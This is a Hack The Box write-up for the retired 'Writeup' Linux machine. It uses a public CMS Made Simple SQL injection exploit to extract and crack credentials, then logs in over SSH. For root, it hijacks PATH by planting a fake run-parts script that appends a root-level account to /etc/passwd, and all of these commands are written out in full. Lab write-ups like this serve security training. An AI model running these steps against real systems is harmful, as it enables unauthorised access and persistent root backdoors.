---
layout: writeup
name: "Writeup"
platform: "HackTheBox"
category: "retired"
difficulty: "Easy"
permalink: /writeups/retired/writeup/
os: "Hack The Box"
date: 2025-11-12
pwned: true
---
# 🧪 Writeup – Hack The Box

**Platform:** Hack The Box  
**Difficulty:** Easy  
**IP Address:** 10.10.10.138  
**Date Completed:** [Insert Date]  

---

## 🧭 Overview

Writeup is an Easy-rated Linux machine that features a web application powered by CMS Made Simple. A SQL injection vulnerability allows us to extract credentials and gain SSH access. Privilege escalation is achieved by exploiting the `run-parts` mechanism used in SSH login scripts. By taking advantage of writable paths in `PATH`, a fake `run-parts` script is used to insert a root-level user into `/etc/passwd`.

---

## 🔍 Enumeration

### 🔎 Nmap

```bash
nmap -sV -sT -sC -o nmapinitial writeup.htb
```

```
22/tcp open  ssh     OpenSSH 7.4p1 Debian
80/tcp open  http    Apache httpd 2.4.25
```

Found `/writeup` via `robots.txt`, which revealed a CMS Made Simple site.

---

## 🪜 Foothold

### 📦 Web Exploitation

Identified **CMS Made Simple** via meta tag. Used a known SQLi exploit from 2019:

```bash
python 46635.py -u http://writeup.htb/writeup/ --crack -w /usr/share/wordlists/rockyou.txt
```

Extracted:
- Username: `jkr`
- Password (cracked): `raykayjay9`

### 🔑 SSH Access

```bash
ssh jkr@writeup.htb
# password: raykayjay9
```

📄 `user.txt`  
`1c0a66ed************************`

---

## ⚙️ Privilege Escalation

- Used `pspy32` to monitor processes
- Observed `run-parts` execution on SSH login:
```bash
sh -c /usr/bin/env -i PATH=... run-parts ...
```

- Verified `jkr` is in `staff` group, which has write access to `/usr/local/bin`

### 🛠 Exploit

1. Created malicious `run-parts` script:
```bash
#!/bin/bash
echo 'rooot:gDlPrjU6SWeKo:0:0:root:/root:/bin/bash' >> /etc/passwd
```

2. Saved it to `/usr/local/bin/run-parts` and made it executable
3. Reconnected via SSH to trigger execution
4. Used OpenSSL to generate password hash:
```bash
openssl passwd AAAA
# gDlPrjU6SWeKo
```

5. Switched to new root user:
```bash
su rooot
# password: AAAA
```

📄 `root.txt`  
`f8d7f60a************************`

---

## 🧠 Lessons Learned

- CMS Made Simple had known SQLi exploits that yield credential hashes
- `PATH` order and writable directories can be abused to hijack root-owned scripts
- `pspy` is invaluable for catching real-time privilege escalation triggers

---

## 📸 Proof

![writeup.png](https://raw.githubusercontent.com/inkedqt/ctf-writeups/main/HTB/proofs/writeup.png)